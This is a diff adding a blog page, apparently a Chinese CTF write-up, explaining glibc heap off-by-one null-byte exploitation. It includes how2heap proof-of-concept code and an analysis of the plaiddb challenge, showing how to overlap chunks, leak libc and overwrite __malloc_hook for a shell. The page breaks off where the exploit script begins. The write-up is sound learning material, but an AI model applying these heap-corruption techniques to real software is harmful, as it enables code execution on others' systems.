@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Off_By_One (plaiddb) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        plaiddb快把我肝崩溃了。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Off_By_One (plaiddb)">
+<meta property="og:url" content="http://example.com/2020/03/16/Off_By_One/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        plaiddb快把我肝崩溃了。。">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png">
+<meta property="article:published_time" content="2020-03-16T08:09:47.000Z">
+<meta property="article:modified_time" content="2020-03-16T09:14:17.401Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-Off_By_One" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/16/Off_By_One/" class="article-date">
+  <time class="post-time" datetime="2020-03-16T08:09:47.000Z" itemprop="datePublished">
+    <span class="post-month">3月</span><br/>
+    <span class="post-day">16</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Off_By_One (plaiddb)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        plaiddb快把我肝崩溃了。。<span id="more"></span></p>
+<h2 id="0x00-Off-By-One"><a href="#0x00-Off-By-One" class="headerlink" title="0x00 . Off_By_One"></a>0x00 . Off_By_One</h2><p>​        这个知识点在how2heap里是叫poison_null_byte，结果我上ctf-wiki找writeup的时候没找着，原来人家也叫off_by_one。下面先分析代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Tested in Ubuntu 14.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​        代码一开始还没看懂来着，看着它把b一分为二一头雾水不知道干啥，后来看了下刘老板的blog才理解的。</p>
+<p>​        其大致的意思就是：系统的边界检查不严谨，当chunk填充大小为malloc_size时，整个chunk被字符串填满，而字符串还需要有’\x00’字符结尾，也就将下一个chunk的size的第一个字节修改了，有可能只改了in_use位(0x101 –&gt; 0x100)，有可能size和in_use位都改了(0x111 –&gt; 0x100)，这要看具体的chunk_size和利用过程。</p>
+<p>​        参考如下示意图（没想到画个图要那么久。。）：</p>
+<p>​        1.a = malloc(0x100)        b = malloc(0x200)        c = malloc(0x100)        barrier = malloc(0x100)最后这个chunk是用来隔开top chunk，否则当c释放时，top chunk会将其合并。</p>
+<p>​        2.接着用a的溢出将b_size修改成0x200，并同时在b+0x200的地方写入0x200用作fake_pre_size用来通过检查。然后释放b。系统就会将b到b+0x200的空间释放，而非释放整个b chunk。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png" style="zoom: 25%;" />
+
+
+
+<p>​        3.现在b的可控大小为0x200，存于unsort bin，现在将其进行分割。b1 = malloc(0x100)，b2 = malloc(0x80)。b1用来进行unlink合并，b2用来overlap。</p>
+<p>​        4.释放b1，释放c，系统会根据c的pre_size找到b1的size，发现in_use == 0，于是将其合并。如此一来，b1到c都变成了一个chunk被收到unsort bin中。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/2.png" style="zoom: 25%;" />
+
+<p>​        5.d = malloc(0x400)，可以使得d的一部分与b2发生overlap。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/3.png" style="zoom:30%;" />
+
+<p>​        6.overlap之后可以进行很多攻击。例如先free(d)，再malloc出d到b2中间的部分，此时b2到barrier的剩余空间仍作为一个孤零零的chunk呆在unsort bin，所以其fd，bk都指向main arena，再用可控的chunk b2就可以leak。</p>
+<h2 id="0x01-plaiddb"><a href="#0x01-plaiddb" class="headerlink" title="0x01 . plaiddb"></a>0x01 . plaiddb</h2><p>​        天知道我查了多少个writeup，能基本看懂的也只有ctf-wiki的。。。。（CTF-Wiki🐂🍺！！）</p>
+<h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        64位，文件保护全开。。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/4.png" style="zoom: 67%;" />
+
+<p>​    主要的数据结构如下（参考参考CTF-Wiki，我只分析出前三个。。）：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span>    </span><br><span class="line">    <span class="keyword">char</span> *key;    </span><br><span class="line">    <span class="keyword">long</span> data_size;   </span><br><span class="line">    <span class="keyword">char</span> *data;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span>    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span>    </span><br><span class="line">    <span class="keyword">long</span> what_1;    </span><br><span class="line">    <span class="keyword">long</span> what_2; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    怪不得一大片乱糟糟的指针操作，原来是树结构。那还分析个🔨。</p>
+<p>​    不过看了看writeup好像这题利用跟树结构没啥关系。</p>
+<p>​    主要函数有：GET(show_single)，PUT(add)，DUMP(show_all)，DEL(delete)，read_in。</p>
+<p>​    漏洞在read_in函数里，可以溢出一个空字节。而且此处用到的是realloc()函数，申请的内存大小是可用大小逐次乘2所得的结果，所以说需要特定大小的chunk才能进行溢出。(0x18,0x38,0x78,0xf8,0x1f8)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = <span class="built_in">malloc_usable_size</span>(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(stdin);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">sub_1020</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);				<span class="comment">//realloc require a special size of chunk</span></span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Out of memory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = <span class="built_in">malloc_usable_size</span>(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;								<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        先来跑一遍程序看看：</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/5.png" style="zoom: 67%;" />
+
+<p>​        根据以下heap结构以及ida的静态分析可以看出，每执行一次PUT，系统会分配三个连续的chunk。a.row 结构体(0x40)    b.row key(0x20)    c.row data(size)。结构体中存有指向key和data的指针。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png" style="zoom: 67%;" />
+
+<h3 id="B-Memory-Arrangement"><a href="#B-Memory-Arrangement" class="headerlink" title="B. Memory Arrangement"></a>B. Memory Arrangement</h3><p>​        1.malloc出需要的chunk</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);	<span class="comment">//unsort chunk,</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">0x50</span>);	<span class="comment">//overlap chunk，leak libc_base</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x68</span>);	<span class="comment">//修改其fd，用于fast attack</span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);	<span class="comment">//溢出chunk，修改下一chunk的pre_size和in_use字节（用到了off_by_one漏洞）</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);	<span class="comment">//victim chunk，被溢出chunk</span></span><br><span class="line">barrier = <span class="built_in">malloc</span>(<span class="number">0x400</span>)	<span class="comment">//确保以上chunk不被top chunk合并。</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png" style="zoom:50%;" />
+
+<p>​        2.把a，c，d三个chunk释放。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png" style="zoom:50%;" />
+
+<p>​        3.因为DEL函数也用到了read_in 函数，也可以进行溢出，所以这里DEL(payload)，payload大小为0x1f8，而chunk_d实际可写大小只有0x1f0，因此可以在payload的最后写入fake_pre_size，同时覆写了chunk_e的pre_size和in_use字节。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png" style="zoom:50%;" />
+
+<p>​        4.现在释放chunk_e，系统将寻址至chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,系统将chunk_a unlink，然后合并a到e的所有内存，并入一个unsort chunk。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png" style="zoom:50%;" />
+
+<p>​        5.而chunk_b还在使用，造成了overlap。</p>
+<p>​        6.接下来malloc(0x200)两次，第一次是把原来释放的chunk_a分配出来，第二次是在后来被系统合并的大chunk中割下0x210的空间，然后这个大chunk的地址将和chunk_b重合。由于只有大chunk一个unsort chunk在bin中，因此其fd，bk指向main_arena，于是可以溢出了。</p>
+<h3 id="C-Leak-Libc-base-amp-get-shell"><a href="#C-Leak-Libc-base-amp-get-shell" class="headerlink" title="C. Leak Libc_base &amp; get shell"></a>C. Leak Libc_base &amp; get shell</h3><p>​        1.GET(chunk_b)并通过计算可以得到libc_base，同时也可以算出malloc_hook的地址。</p>
+<p>​        2.用one_gadget得到libc中excute(“/bin/sh”);的地址</p>
+<p>​        3.malloc(0x100)，可以得到chunk_b到chunk_b + 0x100的内存，用来填充chunk_b，并用malloc_hook的上方地址覆写chunk_c的fd。</p>
+<p>​        4.malloc两次，以malloc_hook上方地址为首地址的chunk，写入one_gadget到malloc_hook，完事儿。。</p>
+<h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D  . Exploit"></a>D  . Exploit</h3><p>​        脚本还是得参考CTF-Wiki，自己真是肝不出来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 